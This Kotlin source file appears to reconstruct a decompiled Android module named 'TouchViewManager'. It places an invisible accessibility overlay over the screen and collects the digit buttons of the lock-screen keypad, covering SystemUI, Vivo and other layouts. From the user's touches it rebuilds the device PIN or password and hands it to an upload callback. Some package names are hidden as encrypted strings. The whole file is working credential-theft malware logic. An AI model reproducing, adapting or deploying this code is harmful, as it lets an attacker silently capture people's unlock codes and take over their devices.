package com.storm.safe.rock.service.modules.cipher

import android.accessibilityservice.AccessibilityService
import android.graphics.Rect
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import com.storm.safe.rock.util.StringUtil
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.atomic.AtomicReference

/**
 * 触摸视图管理器 — 管理透明触摸覆盖层和数字键盘按钮收集。
 *
 * JADX: C0339a5.java (745 行)
 * 全静态方法/字段的工具类。
 *
 * 方法映射:
 *   a0 → refreshDigitButtons     (刷新数字按钮列表)
 *   a1 → collectDigitButtons     (收集数字按钮)
 *   a2 → setupTouchOverlay       (设置触摸覆盖层)
 *   a3 → findNodeAtPosition      (查找触摸位置的节点)
 *   a4 → findSpecialKey          (查找特殊键: delete/enter)
 *   a5 → handleTeardownData      (处理拆除数据)
 *   a6 → removeOverlay           (移除覆盖层)
 *   a7 → teardown                (拆除并上传)
 */
object TouchViewManager {

    private const val TAG = "TouchViewManager"

    /** 排除的系统包名列表 */
    val EXCLUDE_PACKAGES: Set<String> = setOf(
        "android",
        "com.android.systemui",
        "com.android.providers.telephony",
        "com.android.providers.media",
        "com.android.providers.settings",
        "com.android.launcher",
        "com.android.launcher3",
        "com.google.android.apps.nexuslauncher",
        "com.miui.home",
        "com.huawei.android.launcher",
        "com.hihonor.android.launcher",
        // vendor: decrypted at build time via StringUtil.decrypt
        StringUtil.decrypt("KFYcdEIoHCEZPSpMHzlFPR4="),   // oppo launcher
        StringUtil.decrypt("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="), // xiaomi security center
        StringUtil.decrypt("KFYcdFsxGiEZPSpMHzlFPR4="),   // iqoo launcher
        "com.bbk.launcher2",
        "com.sec.android.app.launcher",
        "com.samsung.android.incallui",
        "com.oneplus.launcher",
        "com.nothing.launcher",
        "com.realme.launcher",
        "com.transsion.hilauncher",
        "com.android.incallui",
        "com.android.phone",
        "com.google.android.gms",
        "com.google.android.packageinstaller",
        "com.android.packageinstaller"
    )

    /** 最大重试次数 */
    const val MAX_RETRY_COUNT = 5

    // ==================== 状态 ====================

    /** 当前覆盖层视图 */
    var overlayView: AtomicReference<View?> = AtomicReference(null)

    /** 密码数据持有者 */
    val cipherDataHolder: CipherDataHolder = CipherDataHolder()

    /** 监听辅助配置 */
    var listenHelper: ListenHelper? = null

    /** WindowManager */
    var windowManager: WindowManager? = null

    /** AccessibilityService */
    var accessibilityService: AccessibilityService? = null

    /** 屏幕宽度 */
    var screenWidth: Int = 0

    /** 屏幕高度 (减去导航栏) */
    var screenHeight: Int = 0

    /** 当前键盘按钮列表 */
    val digitButtons: CopyOnWriteArrayList<DigitButtonInfo> = CopyOnWriteArrayList()

    /** 当前按键索引 */
    @Volatile
    var currentKeyIndex: Int = -1

    /** 按键计数 */
    @Volatile
    var keyPressCount: Int = 0

    /** Handler */
    val handler: Handler = Handler(Looper.getMainLooper())

    /** 是否已完成按钮收集 */
    @Volatile
    var buttonsCollected: Boolean = false

    /** 重试次数 */
    var retryCount: Int = 0

    /** 是否使用 fallback 模式 */
    @Volatile
    var useFallbackMode: Boolean = false

    /** 删除键引用 */
    val deleteKeyRef: AtomicReference<DigitButtonInfo?> = AtomicReference(null)

    /** 回车键引用 */
    val enterKeyRef: AtomicReference<DigitButtonInfo?> = AtomicReference(null)

    /** 是否接收 ADB 坐标 */
    @Volatile
    var isAdbCoordMode: Boolean = false

    // ==================== 公共方法 ====================

    /**
     * 刷新数字按钮列表（从无障碍节点树收集）。
     * vendor: a0
     */
    fun refreshDigitButtons() {
        val svc = accessibilityService ?: return
        if (overlayView.get() == null && !isAdbCoordMode) return

        digitButtons.clear()
        deleteKeyRef.set(null)
        enterKeyRef.set(null)

        try {
            val roots = collectRoots(svc)
            for (root in roots) {
                collectDigitButtons(root, digitButtons as ArrayList<DigitButtonInfo>)
                if (deleteKeyRef.get() == null) {
                    findSpecialKey(root, isDelete = true)
                }
                if (enterKeyRef.get() == null) {
                    findSpecialKey(root, isDelete = false)
                }
            }
        } catch (_: Exception) {}

        // 按数字分组，每组取最大面积的
        val byDigit = digitButtons.groupBy { it.digit }
        val bestByDigit = byDigit.mapValues { (_, infos) ->
            infos.maxByOrNull { it.bounds.width() * it.bounds.height() }
        }
        val filtered = bestByDigit.values.filterNotNull()

        digitButtons.clear()
        digitButtons.addAll(filtered)
        buttonsCollected = filtered.size >= 10

        Log.d(TAG, "收集到 ${filtered.size} 个数字按钮")

        if (!buttonsCollected) {
            val count = retryCount + 1
            retryCount = count
            if (count < MAX_RETRY_COUNT) {
                handler.postDelayed({ refreshDigitButtons() }, (count * 400).toLong())
            } else {
                useFallbackMode = true
            }
        }
    }

    /**
     * 从 UiObject 树收集数字按钮。
     * vendor: a1
     */
    fun collectDigitButtons(root: UiObject, result: ArrayList<DigitButtonInfo>) {
        val filter: (UiObject) -> Boolean = { node ->
            if (!node.isClickable()) {
                false
            } else {
                val text = node.getText()?.trim() ?: ""
                val desc = node.getContentDescription()?.trim() ?: ""
                val id = node.getResourceId() ?: ""

                val isDigitText = text.length == 1 && Character.isDigit(text[0])
                val isDigitDesc = desc.length == 1 && Character.isDigit(desc[0])
                val isDigitId = id.contains(":id/") &&
                    !id.contains("delete", ignoreCase = true) &&
                    !id.contains("enter", ignoreCase = true) &&
                    !id.contains("cancel", ignoreCase = true) &&
                    id.lastOrNull()?.let { Character.isDigit(it) } == true

                isDigitText || isDigitDesc || isDigitId
            }
        }

        val matched = ArrayList<UiObject>()
        root.findAll(filter, matched)

        for (node in matched) {
            val bounds = node.getBounds() ?: continue
            if (bounds.width() < 10 || bounds.height() < 10) continue

            val text = node.getText()?.trim() ?: ""
            val desc = node.getContentDescription()?.trim() ?: ""
            val id = node.getResourceId() ?: ""

            val digit: Int = when {
                text.length == 1 && Character.isDigit(text[0]) -> text[0] - '0'
                desc.length == 1 && Character.isDigit(desc[0]) -> desc[0] - '0'
                id.contains(":id/") -> {
                    val lastChar = id.lastOrNull()
                    if (lastChar != null && Character.isDigit(lastChar)) {
                        Character.digit(lastChar.code, 10)
                    } else -1
                }
                else -> -1
            }

            if (digit in 0..9) {
                result.add(DigitButtonInfo(digit, bounds, id, text, desc, node.nodeInfo))
            }
        }
    }

    /**
     * 设置触摸覆盖层。
     * vendor: a2
     */
    fun setupTouchOverlay(service: AccessibilityService) {
        try {
            if (overlayView.get() != null) return

            currentKeyIndex = -1
            cipherDataHolder.touchPoints.clear()
            cipherDataHolder.propResponses.clear()
            cipherDataHolder.listenHelper = ListenHelper.clone(listenHelper)

            digitButtons.clear()
            buttonsCollected = false
            retryCount = 0
            useFallbackMode = false

            val wm = service.getSystemService("window") as WindowManager
            val point = android.graphics.Point()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealSize(point)
            screenWidth = point.x

            val navBarHeight = try {
                val id = service.resources.getIdentifier("navigation_bar_height", "dimen", "android")
                if (id > 0) service.resources.getDimensionPixelSize(id) else 0
            } catch (_: Exception) { 0 }
            screenHeight = point.y - navBarHeight

            // 检查实际窗口宽度
            try {
                val root = service.rootInActiveWindow
                val window = root?.window
                if (window != null) {
                    val rect = Rect()
                    window.getBoundsInScreen(rect)
                    if (rect.width() > screenWidth) {
                        screenWidth = rect.width()
                    }
                }
            } catch (_: Exception) {}

            val layoutParams = WindowManager.LayoutParams().apply {
                type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                format = 1
                flags = 4786090 // vendor 固定值
                gravity = android.view.Gravity.START or android.view.Gravity.TOP
                x = 0
                y = 0
                width = screenWidth
                height = screenHeight
                alpha = 1.0f
                dimAmount = 0.01f
            }

            val view = View(service).apply {
                setBackgroundColor(0) // 全透明
                this.alpha = 1.0f
                setOnTouchListener(OverlayTouchListener())
            }

            if (windowManager == null) {
                windowManager = wm
            }
            windowManager?.addView(view, layoutParams)
            overlayView.set(view)
            keyPressCount = 0

            handler.postDelayed({ refreshDigitButtons() }, 300L)

        } catch (_: Exception) {}
    }

    /**
     * 查找触摸位置对应的 UiObject。
     * vendor: a3
     */
    fun findNodeAtPosition(service: AccessibilityService, x: Float, y: Float): UiObject? {
        try {
            val windows = service.windows
            if (windows != null && windows.isNotEmpty()) {
                for (window in windows) {
                    val root = window.root ?: continue
                    val uiRoot = UiObject.Companion.createRoot(root) ?: continue
                    val found = uiRoot.findAtPoint(x, y)
                    if (found != null) return found
                }
            }
            val fallbackRoot = UiObject.Companion.createRoot(service.rootInActiveWindow) ?: return null
            return fallbackRoot.findAtPoint(x, y)
        } catch (_: Exception) {
            return null
        }
    }

    /**
     * 查找特殊键（删除/回车）。
     * vendor: a4
     */
    fun findSpecialKey(root: UiObject, isDelete: Boolean) {
        val filter: (UiObject) -> Boolean = if (isDelete) {
            { node ->
                val id = node.getResourceId() ?: ""
                val desc = node.getContentDescription() ?: ""
                id.contains("delete", ignoreCase = true) ||
                    desc.contains("删除") ||
                    desc.equals("delete", ignoreCase = true)
            }
        } else {
            { node ->
                val id = node.getResourceId() ?: ""
                val desc = node.getContentDescription() ?: ""
                id.contains("enter", ignoreCase = true) ||
                    desc.contains("确认") ||
                    desc.equals("enter", ignoreCase = true)
            }
        }

        val found = root.findFirst(filter) ?: return
        val bounds = found.getBounds() ?: return
        if (bounds.width() < 10 || bounds.height() < 10) return

        val digit = if (isDelete) -1 else -2
        val id = found.getResourceId() ?: ""
        val text = found.getText() ?: ""
        val desc = found.getContentDescription() ?: ""
        val info = DigitButtonInfo(digit, bounds, id, text, desc, found.nodeInfo)
        (if (isDelete) deleteKeyRef else enterKeyRef).set(info)
    }

    /**
     * 处理拆除数据 — 提取密码并上传。
     * vendor: a5
     */
    fun handleTeardownData(adbPoints: List<Point>, save: Boolean, isAdbMode: Boolean) {
        if (isAdbMode) {
            try {
                if (adbPoints.isNotEmpty()) {
                    cipherDataHolder.touchPoints.clear()
                    cipherDataHolder.touchPoints.addAll(adbPoints)
                    cipherDataHolder.propResponses.clear()
                    for ((index, point) in adbPoints.withIndex()) {
                        cipherDataHolder.propResponses.add(
                            ListenPropResponse(
                                index, "adb_coord",
                                "${point.x},${point.y}",
                                System.nanoTime()
                            )
                        )
                    }
                    currentKeyIndex = adbPoints.size - 1
                    if (cipherDataHolder.listenHelper == null) {
                        cipherDataHolder.listenHelper = ListenHelper().apply { a0 = 2 }
                    }
                }
            } catch (_: Exception) { return }
        }

        // 检查是否有数据可提取
        val hasData: Boolean
        synchronized(cipherDataHolder) {
            hasData = cipherDataHolder.propResponses.isNotEmpty() || cipherDataHolder.touchPoints.isNotEmpty()
        }

        if (save && hasData) {
            cipherDataHolder.extractCipher(
                extractByIdFunc = { responses -> extractByIdFunc(responses) },
                extractByTextFunc = { responses -> extractByTextFunc(responses) },
                validateFunc = { str -> str != null && str.isNotEmpty() && str.length >= 4 },
                resultCallback = { result ->
                    CipherExtractor.uploadCallback?.invoke(result)
                }
            )
        } else {
            synchronized(cipherDataHolder) {
                cipherDataHolder.touchPoints.clear()
                cipherDataHolder.propResponses.clear()
            }
            cipherDataHolder.listenHelper = null
        }

        CipherExtractor.isProcessing.set(false)
        cipherDataHolder.listenHelper = null
        listenHelper = null
        keyPressCount = 0

        if (Looper.myLooper() == Looper.getMainLooper()) {
            removeOverlay()
        } else {
            handler.post { removeOverlay() }
        }
    }

    /**
     * 通过 resource ID 提取密码。
     * vendor: TouchViewManager$handleTeardownData$2
     */
    private fun extractByIdFunc(responses: java.util.LinkedList<ListenPropResponse>): CipherResult? {
        if (responses.isEmpty()) return null

        val systemUiKeys = java.util.LinkedList<String>()
        val vivoKeys = java.util.LinkedList<String>()
        val numKeys = java.util.LinkedList<String>()
        val idDigitKeys = java.util.LinkedList<String>()
        val singleDigitKeys = java.util.LinkedList<String>()

        for (resp in responses) {
            val value = resp.value?.trim() ?: continue
            if (value.isEmpty()) continue

            var matched = false

            if (value.startsWith("com.android.systemui:id/key") &&
                !value.contains("key_enter") && !value.contains("key_delete")) {
                systemUiKeys.add(value.removePrefix("com.android.systemui:id/key"))
                matched = true
            }
            if (value.startsWith("com.android.systemui:id/VivoPinkey")) {
                vivoKeys.add(value.removePrefix("com.android.systemui:id/VivoPinkey"))
                matched = true
            }
            if (value.startsWith("com.android.systemui:id/num")) {
                numKeys.add(value.removePrefix("com.android.systemui:id/num"))
                matched = true
            }
            if (value.startsWith("com.android.systemui:id/char_")) {
                numKeys.add(value.removePrefix("com.android.systemui:id/char_"))
                matched = true
            }
            if (!matched && value.contains(":id/") &&
                !value.contains("delete", ignoreCase = true) &&
                !value.contains("enter", ignoreCase = true) &&
                !value.contains("cancel", ignoreCase = true)) {
                val lastChar = value.lastOrNull()
                if (lastChar != null && Character.isDigit(lastChar)) {
                    idDigitKeys.add(lastChar.toString())
                    matched = true
                }
            }
            if (!matched && value.length == 1 && Character.isDigit(value[0])) {
                singleDigitKeys.add(value)
            }
        }

        val (keys, _) = when {
            systemUiKeys.isNotEmpty() -> systemUiKeys to "SystemUI"
            vivoKeys.isNotEmpty() -> vivoKeys to "Vivo"
            numKeys.isNotEmpty() -> numKeys to "num/char"
            idDigitKeys.isNotEmpty() -> idDigitKeys to "ID尾数字"
            singleDigitKeys.isNotEmpty() -> singleDigitKeys to "单数字"
            else -> return null
        }

        val cipher = keys.joinToString("")
        val result = CipherResult()
        result.textCipher = cipher
        result.cipherGradeCode = if (CipherExtractor.isAllDigits(cipher)) {
            "PASSWORD_QUALITY_NUMERIC_COMPLEX"
        } else {
            "PASSWORD_QUALITY_ALPHANUMERIC"
        }
        return result
    }

    /**
     * 通过文本内容提取密码。
     * vendor: TouchViewManager$handleTeardownData$3
     */
    private fun extractByTextFunc(responses: java.util.LinkedList<ListenPropResponse>): CipherResult? {
        if (responses.isEmpty()) return null

        // 判断是否所有值都是单字符
        val allSingleChar = responses.all { resp ->
            val value = resp.value?.trim()
            value != null && value.length == 1
        }

        if (allSingleChar) {
            // 直接拼接
            val sb = StringBuilder()
            for (resp in responses) {
                val value = resp.value?.trim() ?: ""
                if (value.isNotEmpty()) sb.append(value)
            }
            val cipher = sb.toString()
            if (cipher.isNotEmpty()) {
                val result = CipherResult()
                result.textCipher = cipher
                result.cipherGradeCode = if (CipherExtractor.isAllDigits(cipher)) {
                    "PASSWORD_QUALITY_NUMERIC_COMPLEX"
                } else {
                    "PASSWORD_QUALITY_ALPHANUMERIC"
                }
                return result
            }
        } else {
            // 多字符文本合并（使用最长文本覆盖）
            val pending = java.util.LinkedList<ListenPropResponse>()
            synchronized(CipherExtractor.pendingTexts) {
                if (CipherExtractor.pendingTexts.isNotEmpty()) {
                    pending.addAll(CipherExtractor.pendingTexts)
                    CipherExtractor.pendingTexts.clear()
                }
            }
            pending.addAll(responses)

            val texts = pending.mapNotNull { it.value?.takeIf { v -> v.isNotEmpty() } }
            if (texts.isEmpty()) return null

            val sorted = texts.sortedBy { it.length }
            val maxLen = sorted.maxOf { it.length }
            if (maxLen == 0) return null

            val slots = Array(maxLen) { "*" }
            for (text in sorted) {
                for ((i, ch) in text.withIndex()) {
                    if (ch.toString() != "*") {
                        slots[i] = ch.toString()
                    }
                }
            }

            val cipher = slots.joinToString("")
            if (cipher.isEmpty() || cipher.contains("*") || cipher.length != maxLen) {
                synchronized(CipherExtractor.pendingTexts) {
                    CipherExtractor.pendingTexts.addAll(responses)
                }
                return null
            }

            val result = CipherResult()
            result.textCipher = cipher
            result.cipherGradeCode = if (CipherExtractor.isAllDigits(cipher)) {
                "PASSWORD_QUALITY_NUMERIC_COMPLEX"
            } else {
                "PASSWORD_QUALITY_ALPHANUMERIC"
            }
            return result
        }
        return null
    }

    /**
     * 移除覆盖层。
     * vendor: a6
     */
    fun removeOverlay() {
        try {
            val view = overlayView.get()
            if (windowManager != null && view != null) {
                view.setOnTouchListener(null)
                windowManager?.removeViewImmediate(view)
                overlayView.set(null)
            }
            currentKeyIndex = -1
            digitButtons.clear()
            deleteKeyRef.set(null)
            enterKeyRef.set(null)
            buttonsCollected = false
            useFallbackMode = false
        } catch (_: Exception) {}
    }

    /**
     * 拆除并上传。
     * vendor: a7
     */
    fun teardown(save: Boolean) {
        try {
            if (overlayView.get() == null && !isAdbCoordMode) return

            if (!isAdbCoordMode) {
                handleTeardownData(emptyList(), save, false)
                return
            }

            isAdbCoordMode = false
            // vendor: AbstractC1095q3.f59371a1 (AtomicBoolean) → ADB mode flag
            // vendor: AbstractC1095q3.f59370a0 (List<Point>) → ADB coordinate list
            // vendor: AbstractC1095q3.f59372a2 (Executor) → async ADB coordinate reader
            // These are p000 package classes for ADB coordinate translation. Not replicated.
            handleTeardownData(emptyList(), save, true)
        } catch (_: Exception) {}
    }

    // ==================== 内部辅助 ====================

    /**
     * 收集所有窗口的根 UiObject。
     */
    private fun collectRoots(service: AccessibilityService): List<UiObject> {
        val roots = ArrayList<UiObject>()
        try {
            val windows = service.windows
            if (windows != null) {
                for (window in windows) {
                    val root = window.root ?: continue
                    UiObject.Companion.createRoot(root)?.let { roots.add(it) }
                }
            }
            if (roots.isEmpty()) {
                UiObject.Companion.createRoot(service.rootInActiveWindow)?.let { roots.add(it) }
            }
        } catch (_: Exception) {}
        return roots
    }
}
